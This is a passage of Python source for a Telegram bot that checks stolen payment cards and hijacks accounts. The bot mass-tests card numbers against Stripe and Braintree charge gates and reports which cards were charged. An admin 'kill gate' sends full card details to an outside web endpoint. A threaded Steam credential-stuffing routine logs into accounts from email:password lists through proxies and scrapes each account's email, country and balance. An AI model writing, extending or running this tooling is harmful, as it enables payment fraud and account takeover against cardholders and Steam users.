    msg = f"""み ¡@TOjiCHKBot ↯ ↝ 𝙍𝙚𝙨𝙪𝙡𝙩
𝑺𝑻𝑹𝑰𝑷𝑬 1$
━━━━━━━━━
𝐂𝐂 ➜ <code>{cc_escaped}</code>
𝐒𝐓𝐀𝐓𝐔𝐒 ➜ {status_text}
𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ➜ {html.escape(result['message'])}
𝑽𝑩𝑽  ➜ {html.escape(vbv_info)}
━━━━━━━━━
𝐁𝐈𝐍 ➜ {html.escape(bin_number)}
𝐓𝐘𝐏𝐄 ➜ {html.escape(bin_info.get('type', 'N/A'))}
𝐂𝐎𝐔𝐍𝐓𝐑𝐘 ➜ {html.escape(bin_info.get('country', 'N/A'))}
𝐁𝐀𝐍𝐊 ➜ {html.escape(bin_info.get('bank', 'N/A'))}
━━━━━━━━━
𝗧/𝘁 : {time_taken}s 𝐏𝐫𝐨𝐱𝐲 : None
𝐑𝐄𝐐 : @{html.escape(username)}
𝐃𝐄𝐕 : @mumiru"""
    
    await checking_msg.edit_text(msg, parse_mode='HTML')


async def mst_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Stripe Charge mass check - /mst (max 10 CCs for users, unlimited for admins)"""
    user_id = update.effective_user.id
    username = update.effective_user.username if update.effective_user else None
    is_user_admin = is_admin(user_id, username)
    
    if not is_registered(user_id):
        await update.message.reply_text("⚠️ Please register first using /register")
        return
    
    cards = []
    
    if update.message.reply_to_message:
        if update.message.reply_to_message.document:
            try:
                file = await context.bot.get_file(update.message.reply_to_message.document.file_id)
                file_content = await file.download_as_bytearray()
                text_content = file_content.decode('utf-8', errors='ignore')
                cards = parse_cards_from_text(text_content)
            except Exception as e:
                await update.message.reply_text(f"❌ Error reading file: {e}")
                return
        else:
            replied_text = update.message.reply_to_message.text or update.message.reply_to_message.caption or ""
            cards = parse_cards_from_text(replied_text)
    
    if not cards and context.args:
        text_input = ' '.join(context.args)
        cards = parse_cards_from_text(update.message.text or text_input)
    
    if not cards:
        limit_msg = "Max: 10 CCs for users, unlimited for admins" if not is_user_admin else "Unlimited CCs for admins"
        await update.message.reply_text(
            "╔═══════════════════════════════╗\n"
            "   💳 𝗦𝗧𝗥𝗜𝗣𝗘 𝗖𝗛𝗔𝗥𝗚𝗘 𝗠𝗔𝗦𝗦\n"
            "╚═══════════════════════════════╝\n\n"
            "Usage: /mst CC|MM|YY|CVV (multiple lines)\n"
            "Or reply to a file with /mst\n"
            f"{limit_msg}\n\n"
            "Example:\n"
            "/mst 5484460739505683|04|29|280\n"
            "5484460739505684|05|30|281\n"
            "5484460739505685|06|31|282"
        )
        return
    
    if not is_user_admin:
        cards = cards[:10]
    
    status_msg = await update.message.reply_text(
        f"⏳ Checking {len(cards)} cards via Stripe Charge...\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━━━━━"
    )
    
    approved = []
    declined = []
    errors = []
    
    for i, card in enumerate(cards):
        parts = card.split('|')
        if len(parts) != 4:
            continue
        
        cc, mm, yy, cvv = parts
        if len(yy) == 2:
            yy = f"20{yy}"
        
        result = await asyncio.to_thread(stripe_charge_check, cc, mm, yy, cvv)
        
        if result['status'] == 'APPROVED':
            approved.append(f"✅ {card}")
        elif result['status'] == 'DECLINED':
            declined.append(f"❌ {card[:20]}... - {result['message'][:30]}")
        else:
            errors.append(f"⚠️ {card[:20]}... - {result['message'][:30]}")
        
        if (i + 1) % 3 == 0:
            await status_msg.edit_text(
                f"⏳ Checking Stripe Charge... ({i+1}/{len(cards)})\n"
                f"✅ Approved: {len(approved)} | ❌ Declined: {len(declined)} | ⚠️ Errors: {len(errors)}"
            )
    
    msg = (
        "╔═══════════════════════════════╗\n"
        "   💳 𝗦𝗧𝗥𝗜𝗣𝗘 𝗖𝗛𝗔𝗥𝗚𝗘 𝗥𝗘𝗦𝗨𝗟𝗧𝗦\n"
        "╚═══════════════════════════════╝\n\n"
        f"📊 Total: {len(cards)} | ✅ {len(approved)} | ❌ {len(declined)} | ⚠️ {len(errors)}\n"
        "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
    )
    
    if approved:
        msg += "✅ 𝗔𝗣𝗣𝗥𝗢𝗩𝗘𝗗 (𝗖𝗛𝗔𝗥𝗚𝗘𝗗 $1):\n"
        for a in approved:
            msg += f"{a}\n"
        msg += "\n"
    
    if declined:
        msg += "❌ 𝗗𝗘𝗖𝗟𝗜𝗡𝗘𝗗:\n"
        for d in declined:
            msg += f"{d}\n"
    
    msg += "━━━━━━━━━━━━━━━━━━━━━━━━━━━"
    
    await status_msg.edit_text(msg)


async def kill_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Kill gate - Admin only - /kill CC|MM|YY|CVV"""
    user_id = update.effective_user.id
    username = update.effective_user.username or ""
    
    if not is_admin(user_id, username):
        await update.message.reply_text("❌ This command is for admins only!")
        return
    
    card_data = None
    
    if update.message.reply_to_message:
        replied_text = update.message.reply_to_message.text or update.message.reply_to_message.caption or ""
        card_data = extract_cc_from_text(replied_text)
    
    if not card_data and context.args:
        card_input = ' '.join(context.args)
        card_data = extract_cc_from_text(card_input)
    
    if not card_data:
        await update.message.reply_text(
            "╔═══════════════════════════════╗\n"
            "   💀 𝗞𝗜𝗟𝗟 𝗚𝗔𝗧𝗘 (𝗔𝗗𝗠𝗜𝗡)\n"
            "╚═══════════════════════════════╝\n\n"
            "Usage: /kill CC|MM|YY|CVV\n"
            "Example: /kill 5484460739505683|04|29|280\n\n"
            "Or reply to a message containing CC with /kill"
        )
        return
    
    checking_msg = await update.message.reply_text("⏳ Processing Kill Gate...")
    
    bin_number = card_data['number'][:6]
    bin_info = await get_bin_info(bin_number)
    
    start_time = time.time()
    
    cc_formatted = f"{card_data['number']}|{card_data['month']}|{card_data['year']}|{card_data['cvv']}"
    cc_encoded = cc_formatted.replace("|", "%7C")
    
    api_url = f"https://killer-2-gates-pyjk.vercel.app/ko/cc={cc_encoded}?key=anmokupvtko"
    
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(api_url, timeout=aiohttp.ClientTimeout(total=60)) as response:
                raw_response = await response.text()
                status_code = response.status
    except Exception as e:
        raw_response = str(e)
        status_code = 0
    
    time_taken = round(time.time() - start_time, 2)
    
    cc_display = f"{card_data['number']}|{card_data['month']}|{card_data['year']}|{card_data['cvv']}"
    cc_escaped = html.escape(cc_display)
    
    try:
        response_json = json.loads(raw_response)
        if isinstance(response_json, dict):
            result_msg = response_json.get('message', '') or response_json.get('result', '') or response_json.get('status', '') or raw_response
        else:
            result_msg = raw_response
    except:
        result_msg = raw_response
    
    result_lower = result_msg.lower() if isinstance(result_msg, str) else str(result_msg).lower()
    
    if 'killed' in result_lower or 'success' in result_lower or 'approved' in result_lower or 'charged' in result_lower:
        status_text = "WORK DONE ✅"
    else:
        status_text = "DECLINED ❌"
    
    msg = f"""み ¡@TOjiCHKBot ↯ ↝ 𝙍𝙚𝙨𝙪𝙡𝙩
💀 𝐊𝐈𝐋𝐋 𝐆𝐀𝐓𝐄
━━━━━━━━━
𝐂𝐂 ➜ <code>{cc_escaped}</code>
𝐒𝐓𝐀𝐓𝐔𝐒 ➜ {status_text}
𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ➜ {html.escape(str(result_msg)[:200])}
━━━━━━━━━
𝐁𝐈𝐍 ➜ {html.escape(bin_number)}
𝐓𝐘𝐏𝐄 ➜ {html.escape(bin_info.get('type', 'N/A'))}
𝐂𝐎𝐔𝐍𝐓𝐑𝐘 ➜ {html.escape(bin_info.get('country', 'N/A'))}
𝐁𝐀𝐍𝐊 ➜ {html.escape(bin_info.get('bank', 'N/A'))}
━━━━━━━━━
𝗧/𝘁 : {time_taken}s 𝐏𝐫𝐨𝐱𝐲 : None
𝐑𝐄𝐐 : @{html.escape(username)}
𝐃𝐄𝐕 : @mumiru"""
    
    await checking_msg.edit_text(msg, parse_mode='HTML')


async def bt_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Braintree BT single check - /bt CC|MM|YY|CVV"""
    user_id = update.effective_user.id
    username = update.effective_user.username or update.effective_user.first_name or "Unknown"
    if not is_registered(user_id):
        await update.message.reply_text("⚠️ Please register first using /register")
        return
    
    card_data = None
    
    if update.message.reply_to_message:
        replied_text = update.message.reply_to_message.text or update.message.reply_to_message.caption or ""
        card_data = extract_cc_from_text(replied_text)
    
    if not card_data and context.args:
        card_input = ' '.join(context.args)
        card_data = extract_cc_from_text(card_input)
    
    if not card_data:
        await update.message.reply_text(
            "╔═══════════════════════════════╗\n"
            "   🌳 𝗕𝗥𝗔𝗜𝗡𝗧𝗥𝗘𝗘 𝗕𝗧 𝗖𝗛𝗘𝗖𝗞\n"
            "╚═══════════════════════════════╝\n\n"
            "Usage: /bt CC|MM|YY|CVV\n"
            "Example: /bt 5484460739505683|04|29|280\n\n"
            "Or reply to a message containing CC with /bt"
        )
        return
    
    checking_msg = await update.message.reply_text("⏳ Checking Braintree BT...")
    
    bin_number = card_data['number'][:6]
    bin_info = await get_bin_info(bin_number)
    vbv_info = await get_vbv_info(card_data['number'])
    
    start_time = time.time()
    result = await asyncio.to_thread(
        braintree_bt_check,
        card_data['number'],
        card_data['month'],
        card_data['year'],
        card_data['cvv']
    )
    time_taken = round(time.time() - start_time, 2)
    
    cc_display = f"{card_data['number']}|{card_data['month']}|{card_data['year']}|{card_data['cvv']}"
    cc_escaped = html.escape(cc_display)
    
    if result['status'] == 'CHARGED':
        status_text = "CHARGED 💳"
    elif result['status'] == 'APPROVED':
        status_text = "APPROVED ✅"
    elif result['status'] == 'DECLINED':
        status_text = "DECLINED ❌"
    else:
        status_text = f"{result['status']} ⚠️"
    
    msg = f"""み ¡@TOjiCHKBot ↯ ↝ 𝙍𝙚𝙨𝙪𝙡𝙩
𝐛𝐫𝐚𝐢𝐧𝐭𝐫𝐞𝐞 𝐚𝐮𝐭𝐡
━━━━━━━━━
𝐂𝐂 ➜ <code>{cc_escaped}</code>
𝐒𝐓𝐀𝐓𝐔𝐒 ➜ {status_text}
𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ➜ {html.escape(result['message'])}
𝑽𝑩𝑽 ➜ {html.escape(vbv_info)}
━━━━━━━━━
𝐁𝐈𝐍 ➜ {html.escape(bin_number)}
𝐓𝐘𝐏𝐄 ➜ {html.escape(bin_info.get('type', 'N/A'))}
𝐂𝐎𝐔𝐍𝐓𝐑𝐘 ➜ {html.escape(bin_info.get('country', 'N/A'))}
𝐁𝐀𝐍𝐊 ➜ {html.escape(bin_info.get('bank', 'N/A'))}
━━━━━━━━━
𝗧/𝘁 : {time_taken}s 𝐏𝐫𝐨𝐱𝐲 : None
𝐑𝐄𝐐 : @{html.escape(username)}
𝐃𝐄𝐕 : @mumiru"""
    
    await checking_msg.edit_text(msg, parse_mode='HTML')


async def mbt_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Braintree BT mass check - /mbt (max 10 CCs)"""
    user_id = update.effective_user.id
    if not is_registered(user_id):
        await update.message.reply_text("⚠️ Please register first using /register")
        return
    
    cards = []
    
    if update.message.reply_to_message:
        if update.message.reply_to_message.document:
            try:
                file = await context.bot.get_file(update.message.reply_to_message.document.file_id)
                file_content = await file.download_as_bytearray()
                text_content = file_content.decode('utf-8', errors='ignore')
                cards = parse_cards_from_text(text_content)
            except Exception as e:
                await update.message.reply_text(f"❌ Error reading file: {e}")
                return
        else:
            replied_text = update.message.reply_to_message.text or update.message.reply_to_message.caption or ""
            cards = parse_cards_from_text(replied_text)
    
    if not cards and context.args:
        text_input = ' '.join(context.args)
        cards = parse_cards_from_text(update.message.text or text_input)
    
    if not cards:
        await update.message.reply_text(
            "╔═══════════════════════════════╗\n"
            "   🌳 𝗕𝗥𝗔𝗜𝗡𝗧𝗥𝗘𝗘 𝗕𝗧 𝗠𝗔𝗦𝗦\n"
            "╚═══════════════════════════════╝\n\n"
            "Usage: /mbt CC|MM|YY|CVV (multiple lines)\n"
            "Or reply to a file with /mbt\n"
            "Max: 10 CCs at once\n\n"
            "Example:\n"
            "/mbt 5484460739505683|04|29|280\n"
            "5484460739505684|05|30|281\n"
            "5484460739505685|06|31|282"
        )
        return
    
    cards = cards[:10]
    
    status_msg = await update.message.reply_text(
        f"⏳ Checking {len(cards)} cards via Braintree BT...\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━━━━━"
    )
    
    approved = []
    declined = []
    errors = []
    
    for i, card in enumerate(cards):
        parts = card.split('|')
        if len(parts) != 4:
            continue
        
        cc, mm, yy, cvv = parts
        if len(yy) == 2:
            yy = f"20{yy}"
        
        result = await asyncio.to_thread(braintree_bt_check, cc, mm, yy, cvv)
        
        if result['status'] == 'APPROVED':
            approved.append(f"✅ {card}")
        elif result['status'] == 'DECLINED':
            declined.append(f"❌ {card[:20]}... - {result['message'][:30]}")
        else:
            errors.append(f"⚠️ {card[:20]}... - {result['message'][:30]}")
        
        if (i + 1) % 3 == 0:
            await status_msg.edit_text(
                f"⏳ Checking Braintree BT... ({i+1}/{len(cards)})\n"
                f"✅ Approved: {len(approved)} | ❌ Declined: {len(declined)} | ⚠️ Errors: {len(errors)}"
            )
    
    msg = (
        "╔═══════════════════════════════╗\n"
        "   🌳 𝗕𝗥𝗔𝗜𝗡𝗧𝗥𝗘𝗘 𝗕𝗧 𝗥𝗘𝗦𝗨𝗟𝗧𝗦\n"
        "╚═══════════════════════════════╝\n\n"
        f"📊 Total: {len(cards)} | ✅ {len(approved)} | ❌ {len(declined)} | ⚠️ {len(errors)}\n"
        "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
    )
    
    if approved:
        msg += "✅ 𝗔𝗣𝗣𝗥𝗢𝗩𝗘𝗗 (𝗖𝗛𝗔𝗥𝗚𝗘𝗗):\n"
        for a in approved:
            msg += f"{a}\n"
        msg += "\n"
    
    if declined:
        msg += "❌ 𝗗𝗘𝗖𝗟𝗜𝗡𝗘𝗗:\n"
        for d in declined:
            msg += f"{d}\n"
    
    msg += "━━━━━━━━━━━━━━━━━━━━━━━━━━━"
    
    await status_msg.edit_text(msg)


async def st_reply_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /st when replying to a message"""
    if not update.message.reply_to_message:
        return
    await st_command(update, context)


async def bt_reply_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /bt when replying to a message"""
    if not update.message.reply_to_message:
        return
    await bt_command(update, context)


async def mst_file_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /mst when replying to a file"""
    if not update.message.reply_to_message:
        return
    await mst_command(update, context)


async def mbt_file_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /mbt when replying to a file"""
    if not update.message.reply_to_message:
        return
    await mbt_command(update, context)


async def banned_list_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Show banned users list"""
    user_id = update.effective_user.id
    username = update.effective_user.username or ""
    
    if not is_admin(user_id, username):
        await update.message.reply_text("❌ Admin only command!")
        return
    
    banned = get_banned_users()
    
    if not banned:
        await update.message.reply_text("✅ No banned users!")
        return
    
    msg = "╔═══════════════════════════════╗\n"
    msg += "   🚫 𝗕𝗔𝗡𝗡𝗘𝗗 𝗨𝗦𝗘𝗥𝗦\n"
    msg += "╚═══════════════════════════════╝\n\n"
    
    for uid, data in list(banned.items())[:20]:
        msg += f"🆔 {uid} | @{data.get('username', 'N/A')}\n"
    
    if len(banned) > 20:
        msg += f"\n... and {len(banned) - 20} more"
    
    msg += "\n━━━━━━━━━━━━━━━━━━━━━━━━━━━"
    
    await update.message.reply_text(msg)


def steam_process_combo(combo_line, proxies_list=None):
    """Process a single Steam combo - wrapper for threaded execution"""
    import base64
    import random
    from urllib.parse import quote_plus
    from bs4 import BeautifulSoup
    from Crypto.PublicKey import RSA
    from Crypto.Cipher import PKCS1_v1_5
    
    TIMEOUT = 20
    MAX_RETRIES = 3
    BACKOFF_BASE = 1.5
    BASE_URL = "https://steamcommunity.com"
    GET_RSA_URL = f"{BASE_URL}/login/getrsakey/"
    DO_LOGIN_URL = f"{BASE_URL}/login/dologin/"
    ACCOUNT_URL = "https://store.steampowered.com/account/"
    
    def rsa_encrypt_password(mod_hex, exp_hex, password):
        n = int(mod_hex, 16)
        e = int(exp_hex, 16)
        pub_key = RSA.construct((n, e))
        cipher = PKCS1_v1_5.new(pub_key)
        encrypted = cipher.encrypt(password.encode("utf-8"))
        b64 = base64.b64encode(encrypted).decode()
        return quote_plus(b64)
    
    def do_request(session, method, url, proxies_list=None, **kwargs):
        last_error = None
        for attempt in range(1, MAX_RETRIES + 1):
            try:
                if proxies_list:
                    proxy = random.choice(proxies_list)
                    kwargs["proxies"] = {"http": proxy, "https": proxy}
                resp = session.request(method, url, timeout=TIMEOUT, **kwargs)
                if resp.status_code == 429:
                    time.sleep(BACKOFF_BASE ** attempt + random.uniform(0, 0.5))
                    continue
                return resp
            except Exception as e:
                last_error = e
                if attempt < MAX_RETRIES:
                    time.sleep(BACKOFF_BASE ** attempt + random.uniform(0, 0.5))
        raise last_error
    
    def parse_account_info(html):
        email = ""
        country = ""
        balance = ""
        
        soup = BeautifulSoup(html, "lxml")
        
        email_label = soup.find(string=re.compile(r"Email address", re.I))
        if email_label:
            parent = email_label.find_parent()
            if parent:
                email_span = parent.find_next("span", class_="account_data_field")
                if email_span:
                    email = email_span.get_text(strip=True)
        
        if not email:
            email_match = re.search(r'[\w\.-]+@[\w\.-]+\.\w+', html)
            if email_match:
                email = email_match.group(0)
        
        country_spans = soup.find_all("span", class_="account_data_field")
        for span in country_spans:
            text = span.get_text(strip=True)
            if text and "@" not in text and len(text) > 1:
                country = text
                break
        
        balance_div = soup.find("div", class_="accountData price")
        if not balance_div:
            balance_div = soup.find("div", class_=re.compile(r"accountData.*price"))
        if balance_div:
            balance = balance_div.get_text(strip=True)
        
        if not balance:
            balance_match = re.search(r'\$\d+\.\d{2}', html)
            if balance_match:
                balance = balance_match.group(0)
        
        return email, country, balance
    
    if ":" not in combo_line:
        return {"status": "FAIL", "message": "Invalid combo format", "combo": combo_line}
    
    user, password = combo_line.split(":", 1)
    user = user.strip()
    password = password.strip()
    
    session = requests.Session()
    session.headers.update({
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Accept-Language": "en-US,en;q=0.9",
    })
    
    timestamp = str(int(time.time()))
    
    try:
        rsa_data = f"donotcache={timestamp}&username={user}"
        headers1 = {
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "Origin": BASE_URL,
            "Referer": f"{BASE_URL}/login/",
        }
        r1 = do_request(session, "POST", GET_RSA_URL, data=rsa_data, headers=headers1, proxies_list=proxies_list)
        
        try:
            j = r1.json()
            if not j.get("success"):
                return {"status": "FAIL", "message": "Failed to get RSA key", "combo": combo_line}
            mod = j["publickey_mod"]
            exp = j["publickey_exp"]
            time_stamp = j["timestamp"]
        except Exception:
            return {"status": "FAIL", "message": "RSA response parse error", "combo": combo_line}
            
    except Exception as e:
        return {"status": "RETRY", "message": f"RSA key request error: {e}", "combo": combo_line}
    
    try:
        enc_pass = rsa_encrypt_password(mod, exp, password)
    except Exception as e:
        return {"status": "FAIL", "message": f"Password encryption failed: {e}", "combo": combo_line}
    
    login_payload = (
        f"donotcache={timestamp}&password={enc_pass}&username={user}&twofactorcode=&emailauth="
        f"&loginfriendlyname=&captchagid=-1&captcha_text=&emailsteamid=&rsatimestamp={time_stamp}"
        f"&remember_login=true"
    )
    
    try:
        headers2 = {
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "Origin": BASE_URL,
            "Referer": f"{BASE_URL}/login/",
        }
        r2 = do_request(session, "POST", DO_LOGIN_URL, data=login_payload, headers=headers2, proxies_list=proxies_list)
        
        try:
            login_json = r2.json()
        except Exception:
            return {"status": "FAIL", "message": "Login response not JSON", "combo": combo_line}
        
        if login_json.get("requires_twofactor") or login_json.get("emailauth_needed"):
            return {"status": "HIT_2FA", "message": "2FA/Email Auth Required", "combo": combo_line, "balance": "N/A", "email": "", "country": ""}
        
        if login_json.get("captcha_needed"):
            return {"status": "FAIL", "message": "Captcha required", "combo": combo_line}
        
        if not login_json.get("success"):
            msg = login_json.get("message", "Unknown error")
            return {"status": "FAIL", "message": f"Login failed: {msg}", "combo": combo_line}
        
        transfer_urls = login_json.get("transfer_urls", [])
        transfer_params = login_json.get("transfer_parameters", {})
        
        if transfer_urls and transfer_params:
            for url in transfer_urls:
                try:
                    session.post(url, data=transfer_params, timeout=10)
                except Exception:
                    pass
            
    except Exception as e:
        return {"status": "RETRY", "message": f"Login request error: {e}", "combo": combo_line}
    
    time.sleep(0.5)
    
    try:
        headers3 = {
            "Referer": BASE_URL,
            "Upgrade-Insecure-Requests": "1",
        }
        r_acc = do_request(session, "GET", ACCOUNT_URL, headers=headers3, proxies_list=proxies_list)
        email, country, balance = parse_account_info(r_acc.text)
        
    except Exception as e:
        return {"status": "RETRY", "message": f"Account page error: {e}", "combo": combo_line}
    
    is_free = False
    if balance:
        if "$0" in balance or "0.00" in balance or balance.strip() in ["$0", "$0.00"]:
            is_free = True
    else:
        is_free = True
        balance = "$0.00"
    
    if is_free:
        return {"status": "HIT_FREE", "message": "Free Account", "combo": combo_line, "balance": balance, "email": email, "country": country}
    else:
        return {"status": "HIT_BALANCE", "message": "Balance Account", "combo": combo_line, "balance": balance, "email": email, "country": country}


async def sta_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Single Steam account check - /sta email:pass"""
    user_id = update.effective_user.id
    
    if not is_registered(user_id):
        await update.message.reply_text("⚠️ Please register first using /register")
        return
    
    if not context.args:
        await update.message.reply_text(
            "╔═══════════════════════════════╗\n"
            "   🎮 𝗦𝗧𝗘𝗔𝗠 𝗔𝗖𝗖𝗢𝗨𝗡𝗧 𝗖𝗛𝗘𝗖𝗞𝗘𝗥\n"
            "╚═══════════════════════════════╝\n\n"
            "📝 Usage: /sta email:password\n\n"
            "Example:\n"
            "`/sta example@gmail.com:password123`\n\n"
            "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
            "💡 Use /msta for mass checking",
            parse_mode='Markdown'
        )
        return
    
    combo = ' '.join(context.args)
    
    if ':' not in combo:
        await update.message.reply_text("❌ Invalid format! Use: email:password")
        return
    
    msg = await update.message.reply_text(
        "╔═══════════════════════════════╗\n"
        "   🎮 𝗦𝗧𝗘𝗔𝗠 𝗖𝗛𝗘𝗖𝗞𝗜𝗡𝗚...\n"
        "╚═══════════════════════════════╝\n\n"
        "⏳ Checking account...\n"
        "━━━━━━━━━━━━━━━━━━━━━━━━━━━"
    )
    
    start_time = time.time()
    
    proxies_list = None
    if STEAM_GLOBAL_SETTINGS.get('proxy'):
        proxies_list = [STEAM_GLOBAL_SETTINGS['proxy']]
    
    try:
        loop = asyncio.get_event_loop()
        result = await loop.run_in_executor(None, steam_process_combo, combo, proxies_list)
        
        time_taken = round(time.time() - start_time, 2)
        req_by = f"@{update.effective_user.username}" if update.effective_user.username else update.effective_user.first_name
        
        status = result.get('status', 'FAIL')
        
        if status.startswith('HIT'):
            balance = result.get('balance', 'N/A')
            email = result.get('email', 'N/A')
            country = result.get('country', 'N/A')
            
            status_emoji = "✅" if status == "HIT_BALANCE" else "🆓" if status == "HIT_FREE" else "🔐"
            status_text = "BALANCE ACCOUNT" if status == "HIT_BALANCE" else "FREE ACCOUNT" if status == "HIT_FREE" else "2FA PROTECTED"
            
            response = f"""み ¡@TOjiCHKBot ↯ ↝ 𝙍𝙚𝙨𝙪𝙡𝙩
🎮 𝗦𝗧𝗘𝗔𝗠 𝗖𝗛𝗘𝗖𝗞𝗘𝗥
━━━━━━━━━
𝐀𝐂𝐂 ➜ <code>{combo}</code>
𝐒𝐓𝐀𝐓𝐔𝐒 ➜ {status_text} {status_emoji}
━━━━━━━━━
💰 𝐁𝐀𝐋𝐀𝐍𝐂𝐄 ➜ {balance}
📧 𝐄𝐌𝐀𝐈𝐋 ➜ {email}
🌍 𝐂𝐎𝐔𝐍𝐓𝐑𝐘 ➜ {country}
━━━━━━━━━
𝗧/𝘁 : {time_taken}s
𝐑𝐄𝐐 : {req_by}
𝐃𝐄𝐕 : @mumiru
"""
            await msg.edit_text(response, parse_mode='HTML')
        else:
            await msg.edit_text(
                "╔═══════════════════════════════╗\n"
                "   🎮 𝗦𝗧𝗘𝗔𝗠 𝗖𝗛𝗘𝗖𝗞 𝗥𝗘𝗦𝗨𝗟𝗧\n"
                "╚═══════════════════════════════╝\n\n"
                f"❌ Status: {result.get('message', 'Failed')}\n"
                f"⏱ Time: {time_taken}s\n"
                "━━━━━━━━━━━━━━━━━━━━━━━━━━━"
            )
    except Exception as e:
        logger.error(f"Steam check error: {e}")
        await msg.edit_text(f"❌ Error: {str(e)}")


async def msta_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Mass Steam account check - /msta"""
    user_id = update.effective_user.id
    
    if not is_registered(user_id):
        await update.message.reply_text("⚠️ Please register first using /register")
        return
    
    combos = []
    
    if update.message.reply_to_message:
        if update.message.reply_to_message.document:
            try:
                file = await context.bot.get_file(update.message.reply_to_message.document.file_id)
                file_content = await file.download_as_bytearray()
                text_content = file_content.decode('utf-8', errors='ignore')
                lines = text_content.strip().split('\n')
                combos = [line.strip() for line in lines if ':' in line and line.strip()]
            except Exception as e:
                await update.message.reply_text(f"❌ Error reading file: {e}")
                return
        else:
            text = update.message.reply_to_message.text or update.message.reply_to_message.caption or ""
            lines = text.strip().split('\n')
            combos = [line.strip() for line in lines if ':' in line and line.strip()]
    
    if context.args:
        text = ' '.join(context.args)
        lines = text.strip().split('\n')
        combos.extend([line.strip() for line in lines if ':' in line and line.strip()])
    
    if update.message.text:
        msg_text = update.message.text
        if msg_text.startswith('/msta'):
            remaining = msg_text[5:].strip()
            if remaining:
                lines = remaining.split('\n')
                combos.extend([line.strip() for line in lines if ':' in line and line.strip()])
    
    if not combos:
        await update.message.reply_text(
            "╔═══════════════════════════════╗\n"
            "   🎮 𝗠𝗔𝗦𝗦 𝗦𝗧𝗘𝗔𝗠 𝗖𝗛𝗘𝗖𝗞𝗘𝗥\n"
            "╚═══════════════════════════════╝\n\n"
            "📝 Usage:\n"
            "• Reply to a .txt file with /msta\n"
            "• Reply to a message with combos\n"
            "• /msta email:pass\n  email:pass\n  email:pass\n\n"
            "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
            "💡 Format: email:password (one per line)",
            parse_mode='Markdown'
        )
        return
    
    username = update.effective_user.username
    is_user_admin = is_admin(user_id, username)
    
    max_combos = len(combos) if is_user_admin else min(len(combos), 100)
    combos = combos[:max_combos]
    
    total_combos = len(combos)
    workers = STEAM_GLOBAL_SETTINGS.get('workers', 25)
    
    keyboard = [
        [InlineKeyboardButton(f"✅ Hits: 0", callback_data="null"),
         InlineKeyboardButton(f"❌ Failed: 0", callback_data="null")],
        [InlineKeyboardButton(f"🔄 Checked: 0/{total_combos}", callback_data="null"),
         InlineKeyboardButton(f"⏳ Left: {total_combos}", callback_data="null")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    status_msg = await update.message.reply_text(
        f"⚡ 𝗠𝗔𝗦𝗦 𝗦𝗧𝗘𝗔𝗠 𝗖𝗛𝗘𝗖𝗞𝗜𝗡𝗚\n"
        f"━━━━━━━━━━━━━━━━━━━━━\n"
        f"📊 Total Accounts: {total_combos}\n"
        f"⚙️ Workers: {workers}\n"
        f"🔄 Status: Starting...",
        reply_markup=reply_markup
    )
    
    req_by = f"@{update.effective_user.username}" if update.effective_user.username else update.effective_user.first_name
    
    proxies_list = None
    if STEAM_GLOBAL_SETTINGS.get('proxy'):
        proxies_list = [STEAM_GLOBAL_SETTINGS['proxy']]
    
    hits_count = 0
    failed_count = 0
    checked_count = 0
    
    from concurrent.futures import ThreadPoolExecutor, as_completed
    
    loop = asyncio.get_event_loop()
    
    with ThreadPoolExecutor(max_workers=workers) as executor:
        futures = {executor.submit(steam_process_combo, combo, proxies_list): combo for combo in combos}
        
        for future in as_completed(futures):
            try:
                result = future.result()
                checked_count += 1
                
                status = result.get('status', 'FAIL')
                combo = result.get('combo', '')
                
                if status.startswith('HIT'):
                    hits_count += 1
                    balance = result.get('balance', 'N/A')
                    email = result.get('email', 'N/A')
                    country = result.get('country', 'N/A')
                    
                    status_emoji = "✅" if status == "HIT_BALANCE" else "🆓" if status == "HIT_FREE" else "🔐"
                    status_text = "BALANCE" if status == "HIT_BALANCE" else "FREE" if status == "HIT_FREE" else "2FA"
                    
                    hit_msg = f"""み ¡@TOjiCHKBot ↯ ↝ 𝙍𝙚𝙨𝙪𝙡𝙩
🎮 𝗦𝗧𝗘𝗔𝗠 𝗛𝗜𝗧
━━━━━━━━━
𝐀𝐂𝐂 ➜ <code>{combo}</code>
𝐒𝐓𝐀𝐓𝐔𝐒 ➜ {status_text} {status_emoji}
💰 𝐁𝐀𝐋𝐀𝐍𝐂𝐄 ➜ {balance}
📧 𝐄𝐌𝐀𝐈𝐋 ➜ {email}
🌍 𝐂𝐎𝐔𝐍𝐓𝐑𝐘 ➜ {country}
━━━━━━━━━
𝐑𝐄𝐐 : {req_by}
𝐃𝐄𝐕 : @mumiru
"""
                    await update.message.reply_text(hit_msg, parse_mode='HTML')
                else:
                    failed_count += 1
                
                left_count = total_combos - checked_count
                
                if checked_count % 5 == 0 or checked_count == total_combos:
                    keyboard = [
                        [InlineKeyboardButton(f"✅ Hits: {hits_count}", callback_data="null"),
                         InlineKeyboardButton(f"❌ Failed: {failed_count}", callback_data="null")],
                        [InlineKeyboardButton(f"🔄 Checked: {checked_count}/{total_combos}", callback_data="null"),
